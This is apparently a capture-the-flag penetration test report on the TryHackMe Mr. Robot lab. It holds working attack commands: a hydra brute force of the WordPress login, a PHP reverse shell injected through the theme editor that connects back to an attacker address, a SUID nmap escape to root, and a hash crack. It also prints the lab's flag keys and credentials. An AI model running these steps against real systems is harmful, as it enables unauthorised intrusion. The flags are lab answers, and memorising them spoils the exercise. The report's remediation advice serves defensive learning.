# VAPT Report — Mr. Robot CTF

---

## Cover

| Field           | Detail                                             |
| --------------- | -------------------------------------------------- |
| Report Title    | Vulnerability Assessment & Penetration Test Report |
| Target          | Mr. Robot CTF (TryHackMe Lab)                      |
| Target IP       | 10.49.164.182                                      |
| Report Date     | 2026-03-09                                         |
| Assessor        | r3b3Lli0us_kID                                     |
| Classification  | Confidential — Lab Exercise                        |
| Engagement Type | Black Box Penetration Test                         |

---

## 1. Executive Summary

A penetration test was conducted against the Mr. Robot CTF server at `10.49.164.182`. The objective was to locate all three hidden keys as an unauthenticated external attacker.

**Result: Full system compromise achieved. All 3 keys retrieved.**

Four vulnerabilities were identified — one Critical, one High, one Medium, one Low. The attack chain progressed from web enumeration → credential brute force → authenticated RCE → privilege escalation to root.

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 1 |
| Medium | 1 |
| Low | 1 |
| **Total** | **4** |

**Key risk:** Weak WordPress credentials combined with an unauthenticated wordlist exposed on the web root enabled brute force access. A SUID misconfiguration on an old version of nmap allowed trivial privilege escalation to root.

---

## 2. Scope & Objectives

### Scope

| Target | IP | Service | Included |
|---|---|---|---|
| Mr. Robot Server | 10.49.164.182 | HTTP (80), HTTPS (443), SSH (22) | Yes |

**Out of scope:** All other systems, network infrastructure, external dependencies.

### Objectives
- Identify exposed attack surface via network enumeration
- Retrieve all three hidden keys
- Escalate privileges to root
- Document all findings with evidence and remediation guidance

---

## 3. Methodology

```
Reconnaissance → Enumeration → Exploitation → Post-Exploitation → Reporting
```

| Phase | Activities | Tools |
|---|---|---|
| Reconnaissance | Port scan, service fingerprinting | nmap |
| Enumeration | robots.txt, web directory scan, WordPress user enum | gobuster, curl, hydra |
| Exploitation | WordPress brute force, theme editor RCE | hydra, curl, php-reverse-shell |
| Post-Exploitation | MD5 hash crack, SUID nmap privesc | hashcat, nmap interactive |
| Reporting | Documentation, CVSS scoring, remediation | Manual |

---

## 4. Findings Summary

| ID | Title | CVSS | Severity | Status |
|---|---|---|---|---|
| F01 | Weak WordPress Credentials + No Rate Limiting | 9.8 | Critical | Open |
| F02 | WordPress Theme Editor RCE | 8.8 | High | Open |
| F03 | SUID nmap — Privilege Escalation to Root | 7.8 | High | Open |
| F04 | Sensitive Wordlist Exposed on Web Root | 5.3 | Medium | Open |

---

## 5. Detailed Findings

---

### F01 — Weak WordPress Credentials + No Rate Limiting

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | WordPress Login — `/wp-login.php` |

**Description**

The WordPress administrator account (`elliot`) was protected by the password `ER28-0652` — a value found within the `fsocity.dic` wordlist exposed on the server's web root. The login form has no rate limiting, lockout policy, or CAPTCHA, enabling automated brute-force attacks. Username enumeration was also possible via differing login error messages.

**Evidence**

```bash
# Username confirmed via error message difference
curl -X POST "http://10.49.164.182/wp-login.php" \
  -d "log=elliot&pwd=wrong" | grep "incorrect"
# → "The password you entered for the username elliot is incorrect"

# Brute force with deduplicated wordlist (11,451 entries)
hydra -l elliot -P fsocity-uniq.dic 10.49.164.182 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" -t 30
# → [80][http-post-form] host: 10.49.164.182   login: elliot   password: ER28-0652
```

**Impact**

Administrative access to WordPress allows full CMS control, file editing, and further exploitation (F02).

**Remediation**
- Change the `elliot` password to a strong unique credential (20+ chars)
- Implement account lockout after 5 failed attempts
- Add CAPTCHA or MFA to the admin login
- Do not expose wordlists or sensitive files on the web root

---

### F02 — WordPress Theme Editor RCE

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS Score** | 8.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | WordPress Admin — Theme Editor (`/wp-admin/theme-editor.php`) |

**Description**

WordPress 4.3.1 allows authenticated administrators to edit raw PHP theme files via the built-in theme editor. An attacker with admin credentials can replace a theme template file (e.g. `404.php`) with a PHP reverse shell. Triggering a 404 response causes WordPress to load the template, executing the payload and connecting back to the attacker.

**Evidence**

```bash
# Inject reverse shell into 404.php via theme editor API
curl -s -b /tmp/wp-cookies.txt -X POST "http://10.49.164.182/wp-admin/theme-editor.php" \
  --data-urlencode "newcontent@shell.php" \
  -d "_wpnonce=<value>&action=update&file=404.php&theme=twentyfifteen&template=twentyfifteen"
# → "File edited successfully."

# Trigger execution
curl http://10.49.164.182/doesnotexist
# → Shell connects back to attacker as daemon
```

```
connect to [192.168.205.106] from (UNKNOWN) [10.49.164.182] 34798
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**Impact**

Remote code execution as `daemon`, providing filesystem access and the ability to read credential hashes and escalate privileges.

**Remediation**
- Disable the WordPress theme/plugin file editor (`define('DISALLOW_FILE_EDIT', true)` in wp-config.php)
- Upgrade WordPress to the latest version
- Restrict wp-admin access to trusted IP ranges

---

### F03 — SUID nmap — Privilege Escalation to Root

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS Score** | 7.8 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | `/usr/local/bin/nmap` (version 3.81) |

**Description**

nmap version 3.81 has an `--interactive` mode that drops to a shell. The binary has the SUID bit set, meaning it runs as root regardless of who executes it. Any low-privileged user can exploit this to obtain a root shell via `nmap --interactive` followed by `!sh`.

**Evidence**

```bash
# Discover SUID binaries
find / -perm -4000 -type f 2>/dev/null
# → /usr/local/bin/nmap

# Exploit
nmap --interactive
nmap> !sh
# root shell obtained
whoami
# → root
cat /root/key-3-of-3.txt
# → 04787ddef27c3dee1ee161b21670b4e4
```

**Impact**

Full root-level compromise. Complete control over the system.

**Remediation**
- Remove SUID bit: `chmod -s /usr/local/bin/nmap`
- Upgrade nmap to a current version (interactive mode removed in v5+)
- Audit all SUID binaries regularly: `find / -perm -4000 -type f`

---

### F04 — Sensitive Wordlist Exposed on Web Root

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Affected Component** | `http://10.49.164.182/fsocity.dic` |

**Description**

The file `fsocity.dic` (858,160 entries) is publicly accessible on the web root and referenced in `robots.txt`. This file contains the password used by the WordPress admin account, making brute-force attacks significantly easier.

**Evidence**

```
# robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

# Download
wget http://10.49.164.182/fsocity.dic  → 6.91MB wordlist
```

**Remediation**
- Remove all non-web files from the web root immediately
- Review `robots.txt` — it should not list sensitive files
- Audit web root for exposed credentials, configs, or tools

---

## 6. Attack Timeline

```
[Phase 1 — Recon]
nmap -Pn -sC -sV → Ports 22 (SSH), 80 (HTTP), 443 (HTTPS) — Apache + WordPress 4.3.1

[Phase 2 — Web Enumeration]
robots.txt → key-1-of-3.txt (Key 1) + fsocity.dic (wordlist)
WordPress login error message → username: elliot confirmed

[Phase 3 — Exploitation]
Hydra brute force → elliot:ER28-0652 (F01)
Theme editor injection → 404.php replaced with PHP reverse shell (F02)
curl /doesnotexist → reverse shell → daemon (F02)

[Phase 4 — Privilege Escalation]
/home/robot/password.raw-md5 → c3fcd3d76192e4007dfb496cca67e13b
hashcat MD5 crack → abcdefghijklmnopqrstuvwxyz
su robot → Key 2
find SUID → /usr/local/bin/nmap 3.81 (F03)
nmap --interactive → !sh → root → Key 3

[Keys]
Key 1 → 073403c8a58a1f80d943455fb30724b9
Key 2 → 822c73956184f694993bede3eb39f959
Key 3 → 04787ddef27c3dee1ee161b21670b4e4
```

---

## 7. Conclusion

The Mr. Robot server demonstrated a critically weak security posture. A fully unauthenticated external attacker can achieve root compromise through a four-step chain: enumerate exposed wordlist → brute force WordPress → inject reverse shell via theme editor → exploit SUID nmap.

**Priority actions:**
1. Remove `fsocity.dic` and all non-web files from web root
2. Change WordPress admin password and enforce lockout policy
3. Disable WordPress file editor (`DISALLOW_FILE_EDIT`)
4. Remove SUID bit from nmap and upgrade to current version
5. Upgrade WordPress 4.3.1 (EOL — unsupported)

---

## 8. Appendix

### A — Tools Used

| Tool | Version | Purpose |
|---|---|---|
| nmap | 7.98 | Port scanning, service detection |
| gobuster | — | Web directory enumeration |
| hydra | 9.6 | WordPress brute force |
| curl | — | Web requests, theme editor injection |
| php-reverse-shell | — | Reverse shell payload |
| hashcat | — | MD5 hash cracking |
| netcat | 1.10 | Reverse shell listener |
| Gemini 2.0 Flash | — | Research assistance |

### B — References

- TryHackMe Mr. Robot Room: https://tryhackme.com/room/mrrobot
- php-reverse-shell: /usr/share/webshells/php/php-reverse-shell.php
- GTFOBins nmap: https://gtfobins.github.io/gtfobins/nmap/

### C — Vault Links

- [[Pentesting/Cheatsheets/Methodology]]
- [[Pentesting/Tools]]
- [[HomeLab/Kali-VM-Setup]]
